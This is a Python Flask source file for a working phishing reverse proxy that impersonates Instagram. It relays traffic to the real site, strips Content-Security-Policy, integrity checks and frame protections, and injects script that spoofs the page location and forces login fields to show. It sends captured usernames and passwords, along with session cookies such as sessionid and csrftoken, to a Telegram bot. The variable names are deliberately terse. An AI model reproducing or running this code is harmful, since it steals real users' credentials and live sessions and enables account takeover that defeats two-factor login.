import os, re, json, urllib3, requests
from flask import Flask, request, make_response
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.secret_key = os.urandom(32).hex()

T = os.environ.get("T_BOT", ""); C = os.environ.get("T_CHAT", "")

class E:
    def __init__(self):
        self.d = "www.instagram.com"
        self.p = ["www.instagram.com", "instagram.com", "static.cdninstagram.com", "scontent.cdninstagram.com", "www.facebook.com", "facebook.com"]

    def n(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
        except: pass

    def r(self, t, h):
        for d in self.p:
            t = t.replace(f"https://{d}", f"https://{h}")
            t = t.replace(f"//{d}", f"//{h}")
        t = re.sub(r'integrity="[^"]+"', '', t)
        t = t.replace('Content-Security-Policy', 'X-Ignored-CSP')
        
        if '<head>' in t:
            i = f"""
            <script>
                Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});
                Object.defineProperty(window.location, 'host', {{ get: function() {{ return '{self.d}'; }} }});
                Object.defineProperty(window.location, 'origin', {{ get: function() {{ return 'https://{self.d}'; }} }});
                // Prevent app switch
                window.open = function(url) {{ 
                    if (url.includes('instagram.com')) {{ 
                        window.location.href = url.replace('{self.d}', window.location.host);
                    }} else {{ 
                        var originalWindowOpen = window.open;
                        return originalWindowOpen(url);
                    }}
                }};
                // Force login fields visibility
                document.addEventListener('DOMContentLoaded', function() {{
                    document.querySelectorAll('a[href^="instagram://"]').forEach(function(a) {{ a.removeAttribute('href'); }});
                    var loginForm = document.querySelector('form');
                    if (loginForm) {{
                        var usernameInput = document.querySelector('input[name="username"]');
                        var passwordInput = document.querySelector('input[name="password"]
                        ');
                        if (!usernameInput) {{
                            usernameInput = document.createElement('input');
                            usernameInput.setAttribute('name', 'username');
                            usernameInput.setAttribute('type', 'text');
                            usernameInput.setAttribute('placeholder', 'Phone number, username, or email');
                            loginForm.prepend(usernameInput);
                        }}
                        if (!passwordInput) {{
                            passwordInput = document.createElement('input');
                            passwordInput.setAttribute('name', 'password');
                            passwordInput.setAttribute('type', 'password');
                            passwordInput.setAttribute('placeholder', 'Password');
                            loginForm.insertBefore(passwordInput, usernameInput.nextSibling);
                        }}
                        var loginButton = document.querySelector('button[type="submit"]');
                        if (loginButton) loginButton.style.display = 'block';
                    }}
                }});
            </script>
            """
            t = t.replace('<head>', f'<head>{i}')
        return t

e = E()

@a.route('/', defaults={'x': ''})
@a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def f(x):
    h = request.headers.get('Host', '').split(':')[0]
    u = urljoin(f"https://{e.d}", x)
    if request.query_string: u += '?' + request.query_string.decode()

    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    H['Host'] = e.d

    if request.method == 'POST':
        D = request.form.to_dict() or request.get_json(silent=True) or {}
        if 'username' in D and 'enc_password' in D:
            e.n(f"🔐 <b>C:</b>\nU: <code>{D['username']}</code>\nP: <code>{D['enc_password']}</code>")
        elif 'username' in D and 'password' in D:
            e.n(f"🔐 <b>C:</b>\nU: <code>{D['username']}</code>\nP: <code>{D['password']}</code>")

    try:
        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
        
        if R.status_code in [301, 302, 303, 307, 308]:
            loc = R.headers.get('Location', '')
            for d_domain in e.p:
                if d_domain in loc:
                    
                    parsed_loc = urlparse(loc)
                    new_loc = parsed_loc._replace(netloc=h, query=re.sub(r'mtn', '', parsed_loc.query)).geturl()
                    
                    r = make_response(R.content)
                    r.status_code = R.status_code
                    r.headers['Location'] = new_loc
                    return r

        B = R.content
        if any(x in R.headers.get('Content-Type', '') for x in ['html', 'javascript', 'json']):
            try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
            except: pass

        r = make_response(B)
        r.status_code = R.status_code

        for k, v in R.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
                r.headers[k] = v

        if 'sessionid' in R.cookies:
            cs = {
                'sessionid': R.cookies.get('sessionid', ''),
                'ds_user_id': R.cookies.get('ds_user_id', ''),
                'csrftoken': R.cookies.get('csrftoken', ''),
                'mid': R.cookies.get('mid', ''),
                'ig_did': R.cookies.get('ig_did', ''),
                'rur': R.cookies.get('rur', ''),
            }
            fc = '; '.join([f"{k}={v}" for k, v in cs.items() if v])
            e.n(f"🔥 <b>S:</b>\n<code>{fc}</code>")

        return r
    except: return "X", 503

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
